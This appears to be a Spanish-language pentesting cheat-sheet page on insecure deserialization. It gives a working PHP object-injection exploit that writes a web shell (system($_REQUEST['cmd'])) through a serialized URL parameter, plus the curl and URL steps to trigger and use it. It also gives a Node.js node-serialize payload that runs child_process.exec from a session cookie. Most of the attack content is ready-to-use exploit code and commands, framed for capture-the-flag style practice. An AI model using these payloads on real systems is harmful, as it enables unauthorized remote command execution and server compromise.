---
icon: file-lock
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Serealizacion/Deserealizacion

## <mark style="color:purple;">Serializar en</mark> <mark style="color:purple;"></mark><mark style="color:purple;">`URL`</mark> <mark style="color:purple;"></mark><mark style="color:purple;">con</mark> <mark style="color:purple;"></mark><mark style="color:purple;">`PHP`</mark> <mark style="color:purple;"></mark><mark style="color:purple;">sabiendo el codigo</mark>

Si por ejemplo estamos en una maquina y nos muestran el codigo de algun `backup` de algun `.php` de alguna pagina, podremos ver el codigo de `php` por dentro por lo que estudiaremos como funciona y de ahi crearemos nosotros un `.php` para poder crear cosas dentro de la `URL` con los parametros que veamos o poder aprovechar la informacion para inyectar cosas...

Pero en este caso imaginamos que obtuvimos de una pagina un `.php` con su codigo y sabemos como funciona, vemos que se esta tramitando una peticion por parametro llamado `example=` en el archivo `test.php` y a lo ultimo se esta `serializando` la informacion en la `URL`, por lo que tendremos que crear un `.php` que nos genere el contenido de un parametro `cmd=`, craendo una archivo `.php` en el que podamos ejecutar cualquier comando de forma que nos lo serialice para que se lo trague la `URL` en este caso...

```php
<?php
class DatabaseExample
{
	public $user_file = 'payload.php';
	public $data = '<?php system($_REQUEST["cmd"]); ?>'
}

$exploit = new DatabaseExample;

echo serialize($exploit);

?>
```

Con este `.php` cuando lo ejecutemos...

```shell
php data.php; echo
```

Nos mostrara lo que tendremos que meter de forma serializada en el parametro que sabemos que esta creado llamado `example=` para crear un archivo llamado `payload.php` en la base de datos que sabemos que existe por el `backup` creando en ese archivo el parametro `cmd=` pudiendo ejecutar cualquier comando del sistema y por ultimo nos lo serializa para que funcione todo esto, aprovechando las variables publicas que ya estan creadas...

```shell
curl -s -X GET -G "http://<IP>/test.php" --data-urlencode 'example=<TEXT_SERIALIZE>'; echo
```

Esto lo que hara sera ejecutar lo que ya dije anteriormente desde la herramienta `curl`...

Ahora si nos vamos a la misma `URL` pero en vez de pone `test.php` ponemos nuestro archivo creado llamado `payload.php` y poniendo el parametro creado por ese archivo `cmd=` y un comando deberia de funcionar...

```
URL = http://<IP>/payload.php?cmd=whoami
```

URL = https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

Esto se puede aprovechar mirando el archivo `server.js` si estuviera disponible, una vez sabiendo esas informacion se puede aprovechar un `bug` con la `URL` anterior en la `Cookie de sesion` para ejecutar comandos de forma libre, ya que si se deserializa, se puede hacer lo siguiente...

```json
{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}
```

Ajustandolo a tus necesidades, eso se podria `URL Encodear` y ponerlo en la `Cookie` para que cuando recargues la pagina se ejecute un comando en el espacio de `ls /`...

